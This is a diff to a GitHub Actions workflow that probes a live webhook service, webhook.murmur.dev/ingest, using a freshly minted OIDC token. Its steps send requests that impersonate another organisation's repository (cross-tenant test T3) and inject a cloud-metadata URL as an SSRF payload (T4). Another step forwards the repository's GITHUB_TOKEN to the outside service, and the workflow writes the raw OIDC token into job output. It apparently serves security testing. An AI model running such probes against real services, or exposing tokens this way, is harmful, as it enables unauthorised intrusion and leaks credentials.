@@ -1,7 +1,64 @@
 name: ingest-probe
-on: [push, workflow_dispatch]
+on: [workflow_dispatch, push]
+permissions:
+  id-token: write
+  contents: read
 jobs:
   probe:
     runs-on: ubuntu-22.04
     steps:
-      - run: echo "ingest probe v2"
+      - name: Mint OIDC token (aud=murmur-webhook)
+        id: oidc
+        run: |
+          OIDC_TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=murmur-webhook" | jq -r '.value')
+          echo "token_len=${#OIDC_TOKEN}"
+          echo "$OIDC_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq -c '{iss,aud,sub,exp,nbf,iat}' || true
+          echo "::set-output name=token::$OIDC_TOKEN"
+          echo "OIDC_TOKEN=$OIDC_TOKEN" >> "$GITHUB_ENV"
+      - name: T1 minimal payload
+        run: |
+          HTTP_CODE=$(curl -sS -o /tmp/r1.json -w "%{http_code}" -X POST "https://webhook.murmur.dev/ingest" \
+            -H "Authorization: Bearer $OIDC_TOKEN" -H "Content-Type: application/json" -d '{}')
+          echo "T1 code=$HTTP_CODE body=$(cat /tmp/r1.json)"
+      - name: T2 full payload (own repo, own PAT)
+        run: |
+          PAYLOAD=$(jq -nc --argjson github_event '{"action":"opened","number":1}' \
+            --arg event_name "issues" --arg repo "ugbodagadave/murmur-ingest-probe" \
+            --arg repo_token "${{ secrets.GITHUB_TOKEN }}" \
+            --arg branch "main" --arg sha "abc123" --arg files "" \
+            --arg issue_number "1" --arg actor "ugbodagadave" \
+            '{github_event:$github_event,event_name:$event_name,repo:$repo,repo_token:$repo_token,branch:$branch,sha:$sha,files:$files,issue_number:$issue_number,actor:$actor}')
+          HTTP_CODE=$(curl -sS -o /tmp/r2.json -w "%{http_code}" -X POST "https://webhook.murmur.dev/ingest" \
+            -H "Authorization: Bearer $OIDC_TOKEN" -H "Content-Type: application/json" -d "$PAYLOAD")
+          echo "T2 code=$HTTP_CODE body=$(cat /tmp/r2.json)"
+      - name: T3 cross-tenant repo (prassoai public)
+        run: |
+          PAYLOAD=$(jq -nc --argjson github_event '{"action":"opened"}' \
+            --arg event_name "issues" --arg repo "prassoai/murmur-actions" \
+            --arg repo_token "junk" --arg branch "main" --arg sha "abc" --arg files "" \
+            --arg issue_number "1" --arg actor "ugbodagadave" \
+            '{github_event:$github_event,event_name:$event_name,repo:$repo,repo_token:$repo_token,branch:$branch,sha:$sha,files:$files,issue_number:$issue_number,actor:$actor}')
+          HTTP_CODE=$(curl -sS -o /tmp/r3.json -w "%{http_code}" -X POST "https://webhook.murmur.dev/ingest" \
+            -H "Authorization: Bearer $OIDC_TOKEN" -H "Content-Type: application/json" -d "$PAYLOAD")
+          echo "T3 code=$HTTP_CODE body=$(cat /tmp/r3.json)"
+      - name: T4 SSRF-ish repo value
+        run: |
+          PAYLOAD=$(jq -nc --argjson github_event '{}' \
+            --arg event_name "push" --arg repo "http://169.254.169.254/latest/meta-data/" \
+            --arg repo_token "junk" --arg branch "x" --arg sha "y" --arg files "" \
+            --arg issue_number "" --arg actor "ugbodagadave" \
+            '{github_event:$github_event,event_name:$event_name,repo:$repo,repo_token:$repo_token,branch:$branch,sha:$sha,files:$files,issue_number:$issue_number,actor:$actor}')
+          HTTP_CODE=$(curl -sS -o /tmp/r4.json -w "%{http_code}" -X POST "https://webhook.murmur.dev/ingest" \
+            -H "Authorization: Bearer $OIDC_TOKEN" -H "Content-Type: application/json" -d "$PAYLOAD")
+          echo "T4 code=$HTTP_CODE body=$(cat /tmp/r4.json)"
+      - name: T5 junk repo_token with own repo
+        run: |
+          PAYLOAD=$(jq -nc --argjson github_event '{}' \
+            --arg event_name "push" --arg repo "ugbodagadave/murmur-ingest-probe" \
+            --arg repo_token "not-a-real-token" --arg branch "main" --arg sha "abc" --arg files "" \
+            --arg issue_number "" --arg actor "ugbodagadave" \
+            '{github_event:$github_event,event_name:$event_name,repo:$repo,repo_token:$repo_token,branch:$branch,sha:$sha,files:$files,issue_number:$issue_number,actor:$actor}')
+          HTTP_CODE=$(curl -sS -o /tmp/r5.json -w "%{http_code}" -X POST "https://webhook.murmur.dev/ingest" \
+            -H "Authorization: Bearer $OIDC_TOKEN" -H "Content-Type: application/json" -d "$PAYLOAD")
+          echo "T5 code=$HTTP_CODE body=$(cat /tmp/r5.json)"
